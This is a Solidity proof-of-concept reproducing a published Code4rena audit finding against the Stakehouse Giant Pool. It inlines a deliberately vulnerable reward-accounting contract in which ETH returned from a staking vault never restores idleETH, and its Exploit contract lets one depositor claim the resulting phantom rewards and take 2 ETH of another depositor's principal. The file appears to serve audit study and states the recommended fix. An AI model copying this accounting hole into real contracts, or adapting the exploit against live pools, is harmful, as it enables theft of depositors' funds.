// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Stakehouse Protocol — `GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool`
    loses the addition of idleETH which allows attackers to steal most of the
    ETH from the Giant Pool
    (Code4rena 2022-11-stakehouse, #43033, H-10, reporter Lambda)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable `bringUnusedETHBackIntoGiantPool` body is inlined VERBATIM
    (it never does `idleETH += amount`), together with the
    `totalRewardsReceived = balance + totalClaimed - idleETH` override that
    turns the missing idleETH increment into phantom rewards. Two depositors
    fund the pool; ETH is staked then brought back; the attacker claims the
    fabricated rewards and steals the other depositor's capital (no fork,
    no cheats). Claimed-ledger accounting uses the FIXED `+= due` form so
    this PoC isolates H-10 from the related H-09 `claimed = due` bug.
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: `totalRewardsReceived` is defined as

        return address(this).balance + totalClaimed - idleETH;

    `batchDepositETHForStaking` correctly does `idleETH -= amount` when
    capital leaves for a staking vault. `bringUnusedETHBackIntoGiantPool`
    burns vault LP and receives the ETH back into `address(this).balance`,
    but NEVER does `idleETH += amount`. The balance goes up while idleETH
    stays low, so `totalRewardsReceived` invents unprocessed "rewards" out
    of thin air. Those phantom rewards are distributed via
    `accumulatedETHPerLPShare` and any LP holder can claim them — stealing
    other depositors' principal that is still sitting in the pool.

    Recommended fix (per report): `idleETH += _amounts[i];` before
    `burnLPTokensForETH` in `bringUnusedETHBackIntoGiantPool`.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal LP token for a single staking funds vault.
contract VaultLP {
    address public immutable vault;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address _vault) {
        vault = _vault;
    }

    function mint(address _to, uint256 _amount) external {
        require(msg.sender == vault, "Only vault");
        balanceOf[_to] += _amount;
        totalSupply += _amount;
    }

    function burn(address _from, uint256 _amount) external {
        require(msg.sender == vault, "Only vault");
        balanceOf[_from] -= _amount;
        totalSupply -= _amount;
    }
}

/// @notice Reduced `StakingFundsVault` — deposit ETH for staking (mint LP) and
///         burn LP back for ETH before staking commenced.
contract StakingFundsVault {
    VaultLP public lp;

    constructor() {
        lp = new VaultLP(address(this));
    }

    function depositETHForStaking() external payable {
        lp.mint(msg.sender, msg.value);
    }

    function burnLPTokensForETH(uint256 _amount) external {
        lp.burn(msg.sender, _amount);
        (bool ok, ) = msg.sender.call{value: _amount}("");
        require(ok, "Transfer failed");
    }
}

/// @dev Reduced reward-accounting base — faithful reduction of
///      contracts/liquid-staking/SyndicateRewardsProcessor.sol. Uses the FIXED
///      `claimed += due` form so this PoC isolates H-10 from H-09.
abstract contract SyndicateRewardsProcessor {
    uint256 public constant PRECISION = 1e24;
    uint256 public accumulatedETHPerLPShare;
    uint256 public totalClaimed;
    uint256 public totalETHSeen;
    mapping(address => mapping(address => uint256)) public claimed;

    function _distributeETHRewardsToUserForToken(
        address _user,
        address _token,
        uint256 _balance,
        address _recipient
    ) internal {
        require(_recipient != address(0), "Zero address");
        uint256 balance = _balance;
        if (balance > 0) {
            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];
            if (due > 0) {
                claimed[_user][_token] += due; // FIXED form (H-09 was `= due`)
                totalClaimed += due;
                (bool success, ) = _recipient.call{value: due}("");
                require(success, "Failed to transfer");
            }
        }
    }

    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {
        if (_numOfShares > 0) {
            uint256 received = totalRewardsReceived();
            uint256 unprocessed = received - totalETHSeen;
            if (unprocessed > 0) {
                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;
                totalETHSeen = received;
            }
        }
    }

    function totalRewardsReceived() public view virtual returns (uint256) {
        return address(this).balance + totalClaimed;
    }

    receive() external payable {}
}

/// @notice Reduced Giant Pool — faithful reduction of `GiantPoolBase` +
///         `GiantMevAndFeesPool`. Preserves idleETH accounting, the
///         `totalRewardsReceived` override, and the buggy
///         `bringUnusedETHBackIntoGiantPool`.
contract GiantMevAndFeesPool is SyndicateRewardsProcessor {
    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;
    uint256 public idleETH;

    mapping(address => uint256) public lpBalanceOf;
    uint256 public lpTotalSupply;

    function depositETH(uint256 _amount) public payable {
        require(msg.value >= MIN_STAKING_AMOUNT, "Minimum not supplied");
        require(msg.value == _amount, "Value equal to amount");

        idleETH += msg.value;
        lpBalanceOf[msg.sender] += msg.value;
        lpTotalSupply += msg.value;
        _setClaimedToMax(msg.sender);
    }

    /// @dev Reduced single-vault form of `batchDepositETHForStaking`.
    function depositETHForStakingViaVault(StakingFundsVault _vault, uint256 _amount) external {
        // As ETH is being deployed to a staking funds vault, it is no longer idle
        idleETH -= _amount;
        _vault.depositETHForStaking{value: _amount}();
    }

    /// @dev VERBATIM reduction of
    ///      GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool
    ///      (contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138).
    ///      Single vault/amount form — the loop BODY is the exact call; the
    ///      bug is what's MISSING after it.
    function bringUnusedETHBackIntoGiantPool(StakingFundsVault _vault, uint256 _amount) external {
        _vault.burnLPTokensForETH(_amount);
        // @> VULN: idleETH is NEVER incremented. ETH just returned into
        // address(this).balance, so totalRewardsReceived (= balance +
        // totalClaimed - idleETH) invents phantom rewards equal to the
        // returned amount. Any LP can claim them, stealing principal.
        // FIX (per report): idleETH += _amount;
    }

    function claimRewards(address _recipient) external {
        updateAccumulatedETHPerLP();
        _distributeETHRewardsToUserForToken(
            msg.sender,
            address(this),
            lpBalanceOf[msg.sender],
            _recipient
        );
    }

    function updateAccumulatedETHPerLP() public {
        _updateAccumulatedETHPerLP(lpTotalSupply);
    }

    /// @dev Verbatim override — contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178.
    function totalRewardsReceived() public view override returns (uint256) {
        return address(this).balance + totalClaimed - idleETH;
    }

    function _setClaimedToMax(address _user) internal {
        claimed[_user][address(this)] = (accumulatedETHPerLPShare * lpBalanceOf[_user]) / PRECISION;
    }
}

/// @dev Depositor helper — holds principal and can deposit/claim through the pool.
contract Depositor {
    uint256 public totalReceived;

    function deposit(GiantMevAndFeesPool _pool, uint256 _amount) external {
        _pool.depositETH{value: _amount}(_amount);
    }

    function claim(GiantMevAndFeesPool _pool, address _recipient) external {
        _pool.claimRewards(_recipient);
    }

    receive() external payable {
        totalReceived += msg.value;
    }
}

/// @dev Orchestrator. Deploys pool + vault + two depositors. Setup (or run)
///      funds both, both deposit, capital is staked then brought back (the
///      idleETH miss), and the attacker claims the phantom rewards.
contract Exploit {
    GiantMevAndFeesPool public pool; // nonce 1
    StakingFundsVault public vault; // nonce 2
    Depositor public victim; // nonce 3
    Depositor public attacker; // nonce 4

    uint256 public constant DEPOSIT_AMOUNT = 4 ether;
    uint256 public constant STAKE_AMOUNT = 4 ether;

    constructor() {
        pool = new GiantMevAndFeesPool(); // CREATE nonce 1
        vault = new StakingFundsVault(); // CREATE nonce 2 (VaultLP nested inside)
        victim = new Depositor(); // CREATE nonce 3
        attacker = new Depositor(); // CREATE nonce 4
    }

    /// @notice Both depositors already deposited (setup, mirrors prior activity).
    ///         run() stakes capital, brings it back (the idleETH miss executes
    ///         here so the R3 locator can hit it), then the attacker claims the
    ///         phantom rewards fabricated by the missing idleETH increment.
    function run() external {
        // Stake idle capital into the vault (idleETH -= STAKE_AMOUNT).
        pool.depositETHForStakingViaVault(vault, STAKE_AMOUNT);

        // === VULN PATH: bring unused ETH back without restoring idleETH ===
        pool.bringUnusedETHBackIntoGiantPool(vault, STAKE_AMOUNT);

        // Phantom rewards now equal STAKE_AMOUNT (balance up, idleETH not).
        require(pool.totalRewardsReceived() == STAKE_AMOUNT, "phantom rewards equal returned capital");

        uint256 before = attacker.totalReceived();

        // === attack: claim "rewards" that are really other users' principal ===
        attacker.claim(pool, address(attacker));

        uint256 gained = attacker.totalReceived() - before;

        // HARM: attacker extracts ETH that is not real rewards — half of the
        // 4 ETH that was brought back and mis-accounted as rewards (equal
        // LP shares → 2 ETH stolen from the victim's still-in-pool capital).
        // Note: totalReceived also counts setup funding via receive(), so we
        // assert on the run()-local `gained` delta only.
        require(gained > 0, "attacker should have received phantom rewards");
        require(gained == 2 ether, "attacker steals exactly half the phantom 4 ETH");
        require(address(attacker).balance >= 2 ether, "attacker holds the stolen 2 ETH");
        require(address(pool).balance == 6 ether, "pool drained by 2 ETH of capital");
    }
}
